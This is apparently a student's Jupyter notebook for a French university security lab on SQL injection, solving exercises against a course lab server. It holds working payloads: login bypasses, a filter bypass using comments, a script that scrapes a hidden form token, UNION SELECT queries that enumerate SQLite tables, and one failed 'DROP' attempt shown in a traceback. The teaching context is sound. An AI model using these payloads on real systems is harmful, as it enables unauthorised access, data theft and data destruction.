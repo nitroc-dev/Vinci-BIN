{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 2 : Vulnérabilitées web - Injection SQL (1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1a:\n",
    "Pour ce premier exercice, nous vous demandons de passer le formulaire de connexion codé par un mauvais développeur : http://labosecuipl.alwaysdata.net/23/s02/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex1a/\",\n",
    "    data={  #TODO\n",
    "        \"login\": '\" or 1=1;--',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    "\n",
    ")\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login=\" \" OR 1=1;-- AND password=\" \""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1b:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/23/s02/ex1b/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex1b/\",\n",
    "    data={\n",
    "        \"login\": ' \\' or 1=1;--',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE login=' ' OR 1=1;-- AND password=' '"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Une variante du précédant formulaire a été mit en place, connectez-vous à nouveau à celui-ci : http://labosecuipl.alwaysdata.net/23/s02/ex2/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex2/\",\n",
    "    data={\n",
    "        \"login\": \"') or 1=1;--\",\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <...> FROM <...> WHERE ( login=' ' ) or 1=1;-- AND `password`=' ')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 3:\n",
    "Dans cette nouvelle version, le développeur semble avoir prit conscience que certains caractères ne devraient pas être accepté ... mais vous êtes plus malin que lui, n'est-ce pas ?\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex3/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex3/\",\n",
    "    data={\n",
    "        \"login\": '\"/**/or/**/true;--',\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 4:\n",
    "\n",
    "Une variante du précédant formulaire a été mit en place, il semblerait que notre mauvais dev veuille cette fois-ci empêcher les requêtes automatisées.\n",
    "Encore une fois, trouvez le moyen de vous y connecter : http://labosecuipl.alwaysdata.net/23/s02/ex4/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<p id='result'>Good job, it's time to do the next exercice !</p></html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "session = requests.session()\n",
    "\n",
    "headers = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'}\n",
    "\n",
    "page_form = session.get('http://labosecuipl.alwaysdata.net/23/s02/ex4/');\n",
    "\n",
    "soup = BeautifulSoup(page_form.text)\n",
    "token = soup.find('input', {\"type\": \"hidden\"})['value']\n",
    "\n",
    "page = session.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex4/\",\n",
    "    data={\n",
    "        \"login\": \"'/**/or/**/true;--\",\n",
    "        \"password\": \"\",\n",
    "        \"token\": token\n",
    "    },\n",
    "    headers=headers\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 5:\n",
    "Un espion sur place m'a confirmé que, ne parvenant pas à circonvenir nos injections, le dévelopeur derrière ce site à juste décidé de vider la base de donnée `users`. Il s'est venté bruyament de sa nouvelle idée à coté de la machine à café :\n",
    "\n",
    "> \"J'ai vidé la base de donnée ! Haha ! La requête sql de connexion ne peut plus renvoyé de login utilisateur donc impossible pour eux de se connecter ! Haha, ces maudits hackers ne m'auront pas cette fois-ci !\".\n",
    "\n",
    "Désormait, toutes les requêtes, même injectée \"toujours vraie\" sont vide ... C'est embêtant mais je suis sûr qu'on peut arranger le coup !\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex5/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex5/\",\n",
    "    data={\n",
    "        \"login\": \"' UNION SELECT 'a', 'b' ;--\",\n",
    "        \"password\": \"\"\n",
    "    }\n",
    ")\n",
    "\n",
    "if \"Good job\" in page.text:\n",
    "    print(\"Exercice réussi\")\n",
    "else:\n",
    "    print(\"Ho non :'-(\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6a:\n",
    "Pour ce nouvel exercice, nous allons utiliser un nouveau formulaire. Ce formulaire nous permet de chercher parmi les éléments du tableau périodique des éléments. Par exemple, si vous cherchez \"Co*\", vous obtiendrez les informations sur le copper (cuivre) et le cobalt.\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/23/s02/ex6/\n",
    "\n",
    "Commencez par récupérer le numéro de version de notre base de donnée. Ici, nous connaissons le type de base de donnée : SQLITE, un petit détour par la documentation nous permet deconnaître la fonction parfait pour cela : https://www.sqlite.org/lang_corefunc.html#sqlite_version."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<style type=\"text/css\">\n",
      "table, th, td {\n",
      "   border: 1px solid black;\n",
      "}\n",
      "</style>\n",
      "<body>\n",
      "<form action='.' method='GET'>\n",
      "  Name:<br>\n",
      "  <input type='text' name='name'><br>\n",
      "  <input type='submit' value='Submit'>\n",
      "</form>\n",
      "\n",
      "<h2>Request for name : \"'UNION SELECT sqlite_version(), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a';--\"</h2><table>\n",
      "        <tr><th>name</th><th>symbol</th><th>atomic_number</th><th>atomic_weight</th><th>density</th><th>melting_point</th><th>boiling_point</th><th>atomic_radius</th><th>covalent_radius</th><th>ionic_radius</th><th>specific_volume</th><th>specific_heat</th><th>heat_fusion</th><th>heat_evaporation</th><th>thermal_conductivity</th><th>pauling_electronegativity</th><th>first_ionisation_energy</th><th>oxidation_states</th><th>electronic_configuration</th><th>lattice</th><th>lattice_constant</th></tr><tr>    <td>3.27.2</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr></table></body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex6/\",\n",
    "    params={\n",
    "        \"name\": \"'UNION SELECT sqlite_version(), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a';--\",\n",
    "    }\n",
    ")\n",
    "\n",
    "print(page.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pouvez-vous en déduire la syntaxe de la requête SQL présente dans ce formulaire et dans laquelle votre injection fonctionne ?"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "SELECT <... 21 elements> FROM <TABLE> WHERE name LIKE '' UNION SELECT sqlite_version(), 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a';--';"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6b:\n",
    "Dans le même ordre d’idée, je vous invite à récupérer la liste des tables présentes dans cette base de donnée.\n",
    "\n",
    "Comme souvent, la lecture de la documentation peut vous faciliter la vie : https://www.sqlite.org/faq.html#q7\n",
    "\n",
    "<sup><sub>(Et comme bien souvent ... la vrai vie c'est compliqué : https://www.sqlite.org/schematab.html#alternative_names )</sub></sup>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<style type=\"text/css\">\n",
      "table, th, td {\n",
      "   border: 1px solid black;\n",
      "}\n",
      "</style>\n",
      "<body>\n",
      "<form action='.' method='GET'>\n",
      "  Name:<br>\n",
      "  <input type='text' name='name'><br>\n",
      "  <input type='submit' value='Submit'>\n",
      "</form>\n",
      "\n",
      "<h2>Request for name : \"'UNION SELECT name, 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a' FROM sqlite_master WHERE type='table';--\"</h2><table>\n",
      "        <tr><th>name</th><th>symbol</th><th>atomic_number</th><th>atomic_weight</th><th>density</th><th>melting_point</th><th>boiling_point</th><th>atomic_radius</th><th>covalent_radius</th><th>ionic_radius</th><th>specific_volume</th><th>specific_heat</th><th>heat_fusion</th><th>heat_evaporation</th><th>thermal_conductivity</th><th>pauling_electronegativity</th><th>first_ionisation_energy</th><th>oxidation_states</th><th>electronic_configuration</th><th>lattice</th><th>lattice_constant</th></tr><tr>    <td>elements</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr><tr>    <td>gemstones</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr><tr>    <td>planets</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "    <td>a</td>\n",
      "</tr></table></body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex6/\",\n",
    "    params={\n",
    "        \"name\": \"'UNION SELECT name, 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a' FROM sqlite_master WHERE type='table';--\",\n",
    "    }\n",
    ")\n",
    "\n",
    "print(page.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 6c (bonus):\n",
    "Maintenant que vous connaissez toutes les tables dans cette base de données ainsi que le nom de chaque champ, pourquoi ne pas récupérer le contenu de chacune de ces tables ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "ConnectionError",
     "evalue": "HTTPConnectionPool(host='labosecuipl.alwaysdata.net', port=80): Max retries exceeded with url: /23/s02/ex6/?name=%27UNION+DROP+planets%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27+%3B-- (Caused by NameResolutionError(\"<urllib3.connection.HTTPConnection object at 0x000001DC002EF970>: Failed to resolve 'labosecuipl.alwaysdata.net' ([Errno 11001] getaddrinfo failed)\"))",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mgaierror\u001b[0m                                  Traceback (most recent call last)",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\connection.py:203\u001b[0m, in \u001b[0;36mHTTPConnection._new_conn\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m    202\u001b[0m \u001b[39mtry\u001b[39;00m:\n\u001b[1;32m--> 203\u001b[0m     sock \u001b[39m=\u001b[39m connection\u001b[39m.\u001b[39;49mcreate_connection(\n\u001b[0;32m    204\u001b[0m         (\u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49m_dns_host, \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mport),\n\u001b[0;32m    205\u001b[0m         \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mtimeout,\n\u001b[0;32m    206\u001b[0m         source_address\u001b[39m=\u001b[39;49m\u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49msource_address,\n\u001b[0;32m    207\u001b[0m         socket_options\u001b[39m=\u001b[39;49m\u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49msocket_options,\n\u001b[0;32m    208\u001b[0m     )\n\u001b[0;32m    209\u001b[0m \u001b[39mexcept\u001b[39;00m socket\u001b[39m.\u001b[39mgaierror \u001b[39mas\u001b[39;00m e:\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\util\\connection.py:60\u001b[0m, in \u001b[0;36mcreate_connection\u001b[1;34m(address, timeout, source_address, socket_options)\u001b[0m\n\u001b[0;32m     58\u001b[0m     \u001b[39mraise\u001b[39;00m LocationParseError(\u001b[39mf\u001b[39m\u001b[39m\"\u001b[39m\u001b[39m'\u001b[39m\u001b[39m{\u001b[39;00mhost\u001b[39m}\u001b[39;00m\u001b[39m'\u001b[39m\u001b[39m, label empty or too long\u001b[39m\u001b[39m\"\u001b[39m) \u001b[39mfrom\u001b[39;00m \u001b[39mNone\u001b[39;00m\n\u001b[1;32m---> 60\u001b[0m \u001b[39mfor\u001b[39;00m res \u001b[39min\u001b[39;00m socket\u001b[39m.\u001b[39;49mgetaddrinfo(host, port, family, socket\u001b[39m.\u001b[39;49mSOCK_STREAM):\n\u001b[0;32m     61\u001b[0m     af, socktype, proto, canonname, sa \u001b[39m=\u001b[39m res\n",
      "File \u001b[1;32mC:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.10_3.10.3056.0_x64__qbz5n2kfra8p0\\lib\\socket.py:955\u001b[0m, in \u001b[0;36mgetaddrinfo\u001b[1;34m(host, port, family, type, proto, flags)\u001b[0m\n\u001b[0;32m    954\u001b[0m addrlist \u001b[39m=\u001b[39m []\n\u001b[1;32m--> 955\u001b[0m \u001b[39mfor\u001b[39;00m res \u001b[39min\u001b[39;00m _socket\u001b[39m.\u001b[39;49mgetaddrinfo(host, port, family, \u001b[39mtype\u001b[39;49m, proto, flags):\n\u001b[0;32m    956\u001b[0m     af, socktype, proto, canonname, sa \u001b[39m=\u001b[39m res\n",
      "\u001b[1;31mgaierror\u001b[0m: [Errno 11001] getaddrinfo failed",
      "\nThe above exception was the direct cause of the following exception:\n",
      "\u001b[1;31mNameResolutionError\u001b[0m                       Traceback (most recent call last)",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\connectionpool.py:790\u001b[0m, in \u001b[0;36mHTTPConnectionPool.urlopen\u001b[1;34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, preload_content, decode_content, **response_kw)\u001b[0m\n\u001b[0;32m    789\u001b[0m \u001b[39m# Make the request on the HTTPConnection object\u001b[39;00m\n\u001b[1;32m--> 790\u001b[0m response \u001b[39m=\u001b[39m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39m_make_request(\n\u001b[0;32m    791\u001b[0m     conn,\n\u001b[0;32m    792\u001b[0m     method,\n\u001b[0;32m    793\u001b[0m     url,\n\u001b[0;32m    794\u001b[0m     timeout\u001b[39m=\u001b[39mtimeout_obj,\n\u001b[0;32m    795\u001b[0m     body\u001b[39m=\u001b[39mbody,\n\u001b[0;32m    796\u001b[0m     headers\u001b[39m=\u001b[39mheaders,\n\u001b[0;32m    797\u001b[0m     chunked\u001b[39m=\u001b[39mchunked,\n\u001b[0;32m    798\u001b[0m     retries\u001b[39m=\u001b[39mretries,\n\u001b[0;32m    799\u001b[0m     response_conn\u001b[39m=\u001b[39mresponse_conn,\n\u001b[0;32m    800\u001b[0m     preload_content\u001b[39m=\u001b[39mpreload_content,\n\u001b[0;32m    801\u001b[0m     decode_content\u001b[39m=\u001b[39mdecode_content,\n\u001b[0;32m    802\u001b[0m     \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mresponse_kw,\n\u001b[0;32m    803\u001b[0m )\n\u001b[0;32m    805\u001b[0m \u001b[39m# Everything went great!\u001b[39;00m\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\connectionpool.py:496\u001b[0m, in \u001b[0;36mHTTPConnectionPool._make_request\u001b[1;34m(self, conn, method, url, body, headers, retries, timeout, chunked, response_conn, preload_content, decode_content, enforce_content_length)\u001b[0m\n\u001b[0;32m    495\u001b[0m \u001b[39mtry\u001b[39;00m:\n\u001b[1;32m--> 496\u001b[0m     conn\u001b[39m.\u001b[39;49mrequest(\n\u001b[0;32m    497\u001b[0m         method,\n\u001b[0;32m    498\u001b[0m         url,\n\u001b[0;32m    499\u001b[0m         body\u001b[39m=\u001b[39;49mbody,\n\u001b[0;32m    500\u001b[0m         headers\u001b[39m=\u001b[39;49mheaders,\n\u001b[0;32m    501\u001b[0m         chunked\u001b[39m=\u001b[39;49mchunked,\n\u001b[0;32m    502\u001b[0m         preload_content\u001b[39m=\u001b[39;49mpreload_content,\n\u001b[0;32m    503\u001b[0m         decode_content\u001b[39m=\u001b[39;49mdecode_content,\n\u001b[0;32m    504\u001b[0m         enforce_content_length\u001b[39m=\u001b[39;49menforce_content_length,\n\u001b[0;32m    505\u001b[0m     )\n\u001b[0;32m    507\u001b[0m \u001b[39m# We are swallowing BrokenPipeError (errno.EPIPE) since the server is\u001b[39;00m\n\u001b[0;32m    508\u001b[0m \u001b[39m# legitimately able to close the connection after sending a valid response.\u001b[39;00m\n\u001b[0;32m    509\u001b[0m \u001b[39m# With this behaviour, the received response is still readable.\u001b[39;00m\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\connection.py:395\u001b[0m, in \u001b[0;36mHTTPConnection.request\u001b[1;34m(self, method, url, body, headers, chunked, preload_content, decode_content, enforce_content_length)\u001b[0m\n\u001b[0;32m    394\u001b[0m     \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mputheader(header, value)\n\u001b[1;32m--> 395\u001b[0m \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mendheaders()\n\u001b[0;32m    397\u001b[0m \u001b[39m# If we're given a body we start sending that in chunks.\u001b[39;00m\n",
      "File \u001b[1;32mC:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.10_3.10.3056.0_x64__qbz5n2kfra8p0\\lib\\http\\client.py:1278\u001b[0m, in \u001b[0;36mHTTPConnection.endheaders\u001b[1;34m(self, message_body, encode_chunked)\u001b[0m\n\u001b[0;32m   1277\u001b[0m     \u001b[39mraise\u001b[39;00m CannotSendHeader()\n\u001b[1;32m-> 1278\u001b[0m \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49m_send_output(message_body, encode_chunked\u001b[39m=\u001b[39;49mencode_chunked)\n",
      "File \u001b[1;32mC:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.10_3.10.3056.0_x64__qbz5n2kfra8p0\\lib\\http\\client.py:1038\u001b[0m, in \u001b[0;36mHTTPConnection._send_output\u001b[1;34m(self, message_body, encode_chunked)\u001b[0m\n\u001b[0;32m   1037\u001b[0m \u001b[39mdel\u001b[39;00m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39m_buffer[:]\n\u001b[1;32m-> 1038\u001b[0m \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49msend(msg)\n\u001b[0;32m   1040\u001b[0m \u001b[39mif\u001b[39;00m message_body \u001b[39mis\u001b[39;00m \u001b[39mnot\u001b[39;00m \u001b[39mNone\u001b[39;00m:\n\u001b[0;32m   1041\u001b[0m \n\u001b[0;32m   1042\u001b[0m     \u001b[39m# create a consistent interface to message_body\u001b[39;00m\n",
      "File \u001b[1;32mC:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.10_3.10.3056.0_x64__qbz5n2kfra8p0\\lib\\http\\client.py:976\u001b[0m, in \u001b[0;36mHTTPConnection.send\u001b[1;34m(self, data)\u001b[0m\n\u001b[0;32m    975\u001b[0m \u001b[39mif\u001b[39;00m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mauto_open:\n\u001b[1;32m--> 976\u001b[0m     \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mconnect()\n\u001b[0;32m    977\u001b[0m \u001b[39melse\u001b[39;00m:\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\connection.py:243\u001b[0m, in \u001b[0;36mHTTPConnection.connect\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m    242\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mconnect\u001b[39m(\u001b[39mself\u001b[39m) \u001b[39m-\u001b[39m\u001b[39m>\u001b[39m \u001b[39mNone\u001b[39;00m:\n\u001b[1;32m--> 243\u001b[0m     \u001b[39mself\u001b[39m\u001b[39m.\u001b[39msock \u001b[39m=\u001b[39m \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49m_new_conn()\n\u001b[0;32m    244\u001b[0m     \u001b[39mif\u001b[39;00m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39m_tunnel_host:\n\u001b[0;32m    245\u001b[0m         \u001b[39m# If we're tunneling it means we're connected to our proxy.\u001b[39;00m\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\connection.py:210\u001b[0m, in \u001b[0;36mHTTPConnection._new_conn\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m    209\u001b[0m \u001b[39mexcept\u001b[39;00m socket\u001b[39m.\u001b[39mgaierror \u001b[39mas\u001b[39;00m e:\n\u001b[1;32m--> 210\u001b[0m     \u001b[39mraise\u001b[39;00m NameResolutionError(\u001b[39mself\u001b[39m\u001b[39m.\u001b[39mhost, \u001b[39mself\u001b[39m, e) \u001b[39mfrom\u001b[39;00m \u001b[39me\u001b[39;00m\n\u001b[0;32m    211\u001b[0m \u001b[39mexcept\u001b[39;00m SocketTimeout \u001b[39mas\u001b[39;00m e:\n",
      "\u001b[1;31mNameResolutionError\u001b[0m: <urllib3.connection.HTTPConnection object at 0x000001DC002EF970>: Failed to resolve 'labosecuipl.alwaysdata.net' ([Errno 11001] getaddrinfo failed)",
      "\nThe above exception was the direct cause of the following exception:\n",
      "\u001b[1;31mMaxRetryError\u001b[0m                             Traceback (most recent call last)",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\requests\\adapters.py:486\u001b[0m, in \u001b[0;36mHTTPAdapter.send\u001b[1;34m(self, request, stream, timeout, verify, cert, proxies)\u001b[0m\n\u001b[0;32m    485\u001b[0m \u001b[39mtry\u001b[39;00m:\n\u001b[1;32m--> 486\u001b[0m     resp \u001b[39m=\u001b[39m conn\u001b[39m.\u001b[39;49murlopen(\n\u001b[0;32m    487\u001b[0m         method\u001b[39m=\u001b[39;49mrequest\u001b[39m.\u001b[39;49mmethod,\n\u001b[0;32m    488\u001b[0m         url\u001b[39m=\u001b[39;49murl,\n\u001b[0;32m    489\u001b[0m         body\u001b[39m=\u001b[39;49mrequest\u001b[39m.\u001b[39;49mbody,\n\u001b[0;32m    490\u001b[0m         headers\u001b[39m=\u001b[39;49mrequest\u001b[39m.\u001b[39;49mheaders,\n\u001b[0;32m    491\u001b[0m         redirect\u001b[39m=\u001b[39;49m\u001b[39mFalse\u001b[39;49;00m,\n\u001b[0;32m    492\u001b[0m         assert_same_host\u001b[39m=\u001b[39;49m\u001b[39mFalse\u001b[39;49;00m,\n\u001b[0;32m    493\u001b[0m         preload_content\u001b[39m=\u001b[39;49m\u001b[39mFalse\u001b[39;49;00m,\n\u001b[0;32m    494\u001b[0m         